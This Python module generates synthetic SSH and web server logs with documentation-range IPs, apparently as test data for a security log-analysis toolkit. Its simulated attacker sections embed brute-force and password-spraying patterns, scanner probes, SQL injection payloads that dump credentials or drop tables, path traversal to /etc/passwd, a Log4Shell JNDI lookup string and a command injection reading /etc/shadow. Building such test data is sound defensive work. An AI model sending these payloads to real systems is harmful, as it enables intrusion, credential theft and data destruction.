"""Generates realistic synthetic logs (RFC 5737 documentation IPs) with injected attacks,
so the toolkit can be demoed and tested without touching real systems or data."""
from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

BASE = datetime(2026, 10, 19, 8, 0, 0, tzinfo=timezone.utc)
USERS = ["alice", "bob", "carol", "dave", "erin", "deploy"]
INTERNAL = [f"10.0.0.{i}" for i in range(11, 21)]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) Safari/605.1.15",
       "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"]
PAGES = ["/", "/index.html", "/about", "/products", "/products/42", "/blog", "/api/v1/items",
         "/static/app.js", "/static/style.css", "/contact", "/login", "/favicon.ico"]


def _ssh(ts, host, kind, user, ip):
    stamp = ts.strftime("%b %e %H:%M:%S")
    pid = random.randint(1000, 60000)
    port = random.randint(30000, 65000)
    if kind == "failed":
        return f"{stamp} {host} sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2"
    return f"{stamp} {host} sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2"


def _web(ts, ip, path, status, ua, size=None, method="GET"):
    size = size if size is not None else random.randint(300, 9000)
    stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def generate(seed: int = 7) -> tuple[list[str], list[str]]:
    random.seed(seed)
    ssh, web = [], []

    # --- benign background ---
    for ip in INTERNAL:
        for _ in range(random.randint(2, 5)):
            t = BASE + timedelta(minutes=random.randint(0, 600))
            if random.random() < 0.1:
                ssh.append(_ssh(t, "bastion", "failed", random.choice(USERS), ip))
                t += timedelta(seconds=8)
            ssh.append(_ssh(t, "bastion", "accepted", random.choice(USERS), ip))
        ua = random.choice(UAS)
        for _ in range(random.randint(15, 40)):
            t = BASE + timedelta(seconds=random.randint(0, 36000))
            path = random.choice(PAGES)
            status = random.choices([200, 304, 404, 302], [80, 12, 5, 3])[0]
            web.append(_web(t, ip, path, status, ua))

    # --- attacker 1: SSH brute force (TEST-NET-3) ---
    ip = "203.0.113.45"
    for i in range(120):
        ssh.append(_ssh(BASE + timedelta(hours=2, seconds=i * 2), "bastion", "failed",
                        random.choice(["root", "admin", "ubuntu", "oracle", "test"]), ip))

    # --- attacker 2: password spraying, one try per account ---
    ip = "198.51.100.23"
    for i in range(40):
        ssh.append(_ssh(BASE + timedelta(hours=3, seconds=i * 20), "bastion", "failed",
                        f"user{i:02d}", ip))

    # --- attacker 3: brute force that SUCCEEDS ---
    ip = "192.0.2.77"
    t0 = BASE + timedelta(hours=5)
    for i in range(18):
        ssh.append(_ssh(t0 + timedelta(seconds=i * 6), "bastion", "failed", "deploy", ip))
    ssh.append(_ssh(t0 + timedelta(seconds=120), "bastion", "accepted", "deploy", ip))

    # --- attacker 4: nikto-style scanner ---
    ip = "203.0.113.99"
    for i in range(90):
        web.append(_web(BASE + timedelta(hours=1, seconds=i), ip, f"/{random.choice(['admin','backup','old','test','cgi-bin','private'])}{i}.php",
                        404, "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Scanner)", 162))
    web.append(_web(BASE + timedelta(hours=1, seconds=95), ip, "/.env", 404, "Nikto/2.5.0", 162))

    # --- attacker 5: sqlmap-style injection ---
    ip = "198.51.100.200"
    payloads = ["/products?id=1%27%20OR%20%271%27=%271", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                "/search?q=1%27;%20DROP%20TABLE%20users;--", "/products?id=1%20AND%20SLEEP(5)",
                "/products?id=1%20AND%20extractvalue(1,concat(0x7e,(select%20version())))"]
    for i, p in enumerate(payloads * 6):
        web.append(_web(BASE + timedelta(hours=4, seconds=i * 3), ip, p, random.choice([200, 500]),
                        "sqlmap/1.8#stable (https://sqlmap.org)"))

    # --- attacker 6: low-volume stealth: traversal + Log4Shell, normal-looking UA ---
    ip = "192.0.2.150"
    for i, p in enumerate(["/download?file=../../../../etc/passwd",
                           "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                           "/api/v1/items?x=${jndi:ldap://203.0.113.9/a}",
                           "/index.php?cmd=;cat%20/etc/shadow"]):
        web.append(_web(BASE + timedelta(hours=6, minutes=i), ip, p, 400, UAS[0]))

    random.shuffle(ssh)
    random.shuffle(web)
    return ssh, web
